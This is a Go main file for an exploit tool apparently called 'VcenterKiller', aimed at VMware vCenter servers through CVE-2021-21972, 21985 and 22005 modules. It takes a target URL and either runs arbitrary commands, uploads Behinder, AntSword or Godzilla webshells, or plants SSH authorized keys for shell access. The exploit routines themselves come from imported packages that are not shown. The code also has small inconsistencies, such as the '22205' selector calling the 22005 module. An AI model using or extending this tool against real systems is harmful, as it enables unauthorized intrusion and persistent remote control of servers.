package main

import (
	"GO_VCENTER/src/c_21972"
	"GO_VCENTER/src/c_21985"
	"GO_VCENTER/src/c_22005"
	"flag"
	"fmt"
	"io/ioutil"
	"os"
)

var (
	h        bool
	url      string
	filename string
	cve      string
	command  string
	proxy    string
	exp_type string
)

func usage() {
	fmt.Println(`Usage of main.exe:
	-u string
		  you target, example: https://192.168.1.1
	-m string
		  you selected cve code, example: 21972 or 22205 or 21985
	-c string
		  you want execute command, example: "whoami"
	-f string
		  to upload webshell, expamle: behinder.jsp or antsword.jsp or gozllia.jsp 
	-t string
		  for CVE-2021-21972, use "ssh" to get ssh shell, not webshell`)
}

func banner() {
	ban := `
			__     __             _              _  ___ _ _
			\ \   / /__ ___ _ __ | |_ ___ _ __  | |/ (_) | | ___ _ __
			 \ \ / / __/ _ \ '_ \| __/ _ \ '__| | ' /| | | |/ _ \ '__|
	  		  \ V / (_|  __/ | | | ||  __/ |    | . \| | | |  __/ |
	   		   \_/ \___\___|_| |_|\__\___|_|    |_|\_\_|_|_|\___|_|       by schira4396
			   `
	fmt.Println(ban)
}

func main() {
	flag.StringVar(&url, "u", "", "your target")
	flag.StringVar(&filename, "f", "", "filename")
	flag.StringVar(&cve, "m", "", "select cve")
	flag.StringVar(&command, "c", "", "command")
	flag.StringVar(&exp_type, "t", "", "CVE-2021-21972 Module")
	flag.Usage = usage
	flag.Parse()
	banner()
	if len(os.Args) == 1 {
		usage()
		os.Exit(0)
	}
	fmt.Println("[*] url: " + url)
	switch cve {
	case "22205":
		{
			c_22005.Test(url, filename)
		}
	case "21985":
		{
			c_21985.Attack(url, command)
		}
	case "21972":
		{
			t, err := ioutil.ReadFile(filename)
			_ = err
			fmt.Println(string(t))
			if exp_type == "ssh" {
				c_21972.Upload_ssh_authorized_keys(url, string(t))
			} else {
				c_21972.Upload_windows_shell(url, string(t))
				c_21972.Upload_linux_shell(url, string(t))
			}
		}
	}

}
